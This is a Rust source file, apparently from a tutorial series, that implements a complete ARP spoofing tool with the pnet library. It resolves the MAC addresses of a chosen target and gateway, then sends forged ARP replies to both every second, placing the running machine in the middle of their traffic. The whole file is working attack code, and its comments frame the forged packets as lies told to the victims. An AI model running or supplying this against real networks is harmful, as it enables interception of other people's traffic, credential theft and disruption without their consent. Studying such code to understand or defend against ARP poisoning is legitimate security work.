use pnet::datalink::{self, Channel, MacAddr, NetworkInterface};
use pnet::packet::Packet;
use pnet::packet::arp::{Arp, ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, Ethernet, EthernetPacket, MutableEthernetPacket};
use std::env;
use std::net::Ipv4Addr;
use std::thread;
use std::time::{Duration, Instant};

const ETHERNET_FRAME_SIZE: usize = 42; // ARP (28) + Ethernet (14)

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: sudo cargo run <TARGET_IP> <GATEWAY_IP>");
        return;
    }

    let target_ip: Ipv4Addr = args[1].parse().expect("Invalid target IP");
    let gateway_ip: Ipv4Addr = args[2].parse().expect("Invalid gateway IP");

    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == "en0") // NOTE: Change if needed
        .expect("Could not find specified interface.");

    let source_mac = interface.mac.expect("Interface has no MAC address.");
    let source_ip = interface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .map(|ip| match ip.ip() {
            std::net::IpAddr::V4(ip) => ip,
            _ => unreachable!(),
        })
        .expect("Interface has no IPv4 address.");

    println!("Resolving MAC addresses...");
    let target_mac = resolve_mac(interface.clone(), source_ip, source_mac, target_ip);
    let gateway_mac = resolve_mac(interface.clone(), source_ip, source_mac, gateway_ip);
    println!("Resolved!");
    println!("  Target MAC: {}", target_mac);
    println!("  Gateway MAC: {}", gateway_mac);

    println!("\nSpoofing started... Press Ctrl+C to stop.");

    loop {
        // Lie to the target: tell it that the gateway's IP is at our MAC address.
        send_arp_reply(
            interface.clone(),
            source_mac,
            target_mac,
            gateway_ip,
            target_ip,
        );

        // Lie to the gateway: tell it that the target's IP is at our MAC address.
        send_arp_reply(
            interface.clone(),
            source_mac,
            gateway_mac,
            target_ip,
            gateway_ip,
        );

        thread::sleep(Duration::from_secs(1));
    }
}

// Sends a forged ARP reply
fn send_arp_reply(
    interface: NetworkInterface,
    source_mac: MacAddr,
    target_mac: MacAddr,
    spoofed_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) {
    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Failed to create channel: {}", e),
    };

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply); // This is a REPLY, not a request
    arp_packet.set_sender_hw_addr(source_mac); // We are the sender
    arp_packet.set_sender_proto_addr(spoofed_ip); // but we lie about our IP
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);

    let mut ethernet_buffer = [0u8; ETHERNET_FRAME_SIZE];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(target_mac);
    ethernet_packet.set_source(source_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(arp_packet.packet());

    tx.send_to(ethernet_packet.packet(), None);
}

// Finds the MAC address for a given IP address (our function from Part 1)
fn resolve_mac(
    interface: NetworkInterface,
    source_ip: Ipv4Addr,
    source_mac: MacAddr,
    target_ip: Ipv4Addr,
) -> MacAddr {
    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Failed to create channel: {}", e),
    };

    // --- Create and send the ARP request packet (same as before) ---
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Request);
    arp_packet.set_sender_hw_addr(source_mac);
    arp_packet.set_sender_proto_addr(source_ip);
    arp_packet.set_target_hw_addr(MacAddr::zero());
    arp_packet.set_target_proto_addr(target_ip);

    let mut ethernet_buffer = [0u8; ETHERNET_FRAME_SIZE];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(source_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(arp_packet.packet());

    tx.send_to(ethernet_packet.packet(), None);
    // --- End of sending logic ---

    // Listen for the reply with a timeout
    let start_time = Instant::now();
    loop {
        // If 2 seconds have passed, give up.
        if start_time.elapsed() > Duration::from_secs(2) {
            panic!(
                "Timeout: No ARP reply received from {}. Check if the IP is correct and the device is online.",
                target_ip
            );
        }

        // Check for a packet
        if let Ok(packet) = rx.next() {
            if let Some(ethernet_frame) = EthernetPacket::new(packet) {
                if ethernet_frame.get_ethertype() == EtherTypes::Arp {
                    if let Some(arp_reply) = ArpPacket::new(ethernet_frame.payload()) {
                        if arp_reply.get_sender_proto_addr() == target_ip
                            && arp_reply.get_operation() == ArpOperations::Reply
                        {
                            return arp_reply.get_sender_hw_addr();
                        }
                    }
                }
            }
        }
    }
}
